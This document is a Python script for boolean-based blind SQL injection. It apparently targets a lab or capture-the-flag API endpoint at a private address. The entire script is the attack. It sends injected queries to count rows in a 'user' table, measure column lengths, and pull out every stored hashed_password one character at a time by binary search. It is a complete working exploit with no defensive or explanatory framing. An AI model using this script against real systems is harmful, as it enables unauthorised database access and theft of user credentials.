
import requests
from urllib.parse import quote
 
URL = "http://10.10.110.20/api/v1/user/validate/asd@asd"
 
 
def get(payload):
    return requests.get(URL + quote(payload))
 
 
def row_count(table, max_rows=64):
    # Test if our Boolean logic is good
    matched = get(f"' or (select count(1) from {table}) not like 0-- -")
    unmatched = get(f"' or (select count(1) from {table}) like 0-- -")
 
    if matched.text == unmatched.text:
        raise Exception(f"Cannot identify number of rows in table: {table}")
 
    # Guess the total number of rows
    for i in range(0, max_rows):
        r = get(f"' or (select count(1) from {table}) like {i}-- -")
        if r.text == matched.text:
            return i
 
    raise Exception(f"Could not identify number of rows in table {table}")
 
 
def column_length(table, column, offset):
    # Test if our Boolean logic is good
    matched = get(f"' or (select length({column}) from {table} limit 1 offset {offset}) not like 0-- -")
    unmatched = get(f"' or (select length({column}) from {table} limit 1 offset {offset}) like 0-- -")

    if matched.text == unmatched.text:
        raise Exception("Cannot get column length")
 
    # Guess the length of the column
    for guess in range(0, 64):
        r = get(f"' or (select length({column}) from {table} limit 1 offset {offset}) like {guess}-- -")
        if r.text == matched.text:
            return guess
 
    raise Exception("Could not identify column length")
 
 
def column_data(table, column, offset, line):
    start = 32
    end = 126
 
    # Test if our logic is good for guessing a character
    # substring ... from 0 for 0 always returns null
    matched = get(f"' or (select ord(substring({column} from 0 for 0)) from {table} limit 1 offset {line}) like 0-- -")
    unmatched = get(f"' or (select ord(substring({column} from 0 for 0)) from {table} limit 1 offset {line}) not like 0-- -")
 
    if matched.text == unmatched.text:
        raise Exception("Cannot perform substring")
 
    # Divide and conquer algorithm to speed things up
    while start != (end - 1):
        halfway = int((end - start) / 2)
        guess = start + halfway
 
        r = get(f"' or (select ord(substring({column} from {offset} for 1)) from {table} limit 1 offset {line}) between {start} and {guess}-- -")
 
        if r.text == matched.text:
            end = guess
        else:
            start = guess
 
    # Once down to two choices, make the final guess
    r = get(f"' or (select ord(substring({column} from {offset} for 1)) from {table} limit 1 offset {line}) like {start}-- -")
    if r.text == matched.text:
        return chr(start)
    else:
        return chr(end)
 
 
if __name__ == "__main__":
    try:
        row_total = row_count("user")

        for i in range(0, row_total):
            length = column_length("user", "hashed_password", i)

            for x in range(0, length):
                char = column_data("user", "hashed_password", x + 1, i)
                print(char, end="", flush=True)
            print()

    except Exception as e:
        print(e)